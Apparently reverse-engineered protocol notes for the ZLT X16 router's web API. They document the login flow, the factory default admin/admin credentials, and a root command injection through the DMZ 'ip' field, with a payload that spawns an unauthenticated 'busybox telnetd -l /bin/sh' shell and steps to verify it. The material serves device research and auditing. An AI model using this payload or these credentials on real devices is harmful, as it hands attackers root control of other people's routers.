# Protocol notes — ZLT X16 web management API

Reverse engineered from the firmware's own served JavaScript
(`/tzwww/js/login.js`, `/tzwww/js/main.js`) and from the request artifact the
device keeps at `/productinfo/tzcfg/iptables/iptables_dmz_function`.

Everything goes through one CGI entry point:

```
POST /cgi-bin/http.cgi?cmd=<n>&method=<GET|POST>&sessionId=<sid>&language=<en|cn>
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: <origin>/login.html
```

The `cmd`, `method`, `sessionId` and `language` appear **both** as query
parameters and inside the JSON body.

## Command numbers (from the `RequestCmd` enum)

| Name | Value | Notes |
|---|---|---|
| `SYS_INFO` | 0 | |
| `NET_CONNECT` / `NET_DISCONNECT` | 48 / 49 | |
| `GET_HTML` | 50 | fetches page fragments |
| `INIT_PAGE` | 80 | device identity, theme, `aeraId` |
| `REBOOT` | 99 | |
| `LOGIN` | 100 | |
| `LOGOUT` | 101 | |
| `CHANGE_PASSWD` | 102 | |
| `NETWORK_SERVICE` | 172 | DMZ / network-service page |
| `GET_DMZ` | 214 | read the DMZ config |
| `GET_NEXT_LOGIN_TIME` | 232 | returns the login token |
| `DEVICE_INFO` | 207 | |

## Login

Two steps. The password is **not** sent in the clear and is **not** base64 —
it is salted with a server token and hashed.

**Step 1** — fetch the token:

```json
{"cmd": 232, "method": "GET", "sessionId": ""}
```

Response: `{"token": "..."}`

**Step 2** — submit credentials:

```json
{
  "cmd": 100,
  "method": "POST",
  "sessionId": "<any random 32 chars>",
  "username": "admin",
  "passwd": "<sha256_hex(token + password)>",
  "isAutoUpgrade": "0"
}
```

Response on success:

```json
{"success":"success","AUTH":"AUTH","sessionId":"...","user_level":"3"}
```

`user_level`/`account_level` is the privilege tier (`1` highest, `3` lowest).
`AUTH` is the flag the UI stores to mean "logged in".

Failure responses use `{"success":"fail","login_fail":"fail","message":"passwd error"}`
plus `login_fail2` / `login_time` when the account is rate-limited.

### Shipped credentials

The firmware ships, identical on every unit of this model:

| Key | Default |
|---|---|
| `SYS_USER_LOGIN_NAME` | `admin` |
| `SYS_USER_LOGIN_PWD` | `admin` |
| `SYS_SENIOR_LOGIN_PWD` | `admin` |
| `SYS_SUPER_LOGIN_NAME` | `superadmin` |
| `SYS_SUPER_LOGIN_PWD` | *(per-device; read it off the unit — never commit it)* |

## The injection point

`NETWORK_SERVICE` (172) with `subcmd: 6` is the network-service page that holds
the DMZ function. Its `ip` field is interpolated into a command that the device
executes **as root**, so `;` starts an additional command.

The device's own saved record of such a request:

```json
{"enabled":"1",
 "ip":"127.0.0.1;busybox telnetd -l \/bin\/sh",
 "cmd":172,"subcmd":6,"success":true,"method":"POST",
 "sessionId":"bda24badbc70d8d821c500304878fdced90380256d76f5584488ff9021525bf0"}
```

General shape:

```json
{
  "cmd": 172,
  "method": "POST",
  "subcmd": 6,
  "sessionId": "<authenticated session>",
  "enabled": "1",
  "ip": "<valid-ipv4>;<command>"
}
```

`busybox telnetd -l /bin/sh` replaces the login program with a shell, so the
resulting daemon performs no authentication at all.

## Verification

A shell started this way is observable without any further protocol work:

- TCP connect to the chosen port succeeds
- the peer sends no `login:` / `username:` / `password:` prompt
- it answers with a shell banner or prompt (`/ #`)

The vendor's own telnet path is different and easy to distinguish:
`/etc/initscripts/start_telnet` runs `telnetd -l /etc/tzscript/telnet_login.sh -p 9876`
— a different port, with a real login handler, gated by `SYS_TELNET_SWITCH`.

## Response quirks worth handling

| Observed | Handling |
|---|---|
| `200 OK` with an **empty body** | treat as an error, not success |
| Connection closed mid-request when a daemon is spawned | treat as "sent", verify out of band |
| `{"message":"NO_AUTH"}` / `LOGIN_TIMEOUT` | session expired; re-login |
| `{"message":"NO_AUTH"}` on the config POST | credentials or session id wrong |

## Notes on scope

This document describes the device's own behaviour, established from artifacts
already present on a device the author controls. It is provided so the tooling
can be maintained and audited.
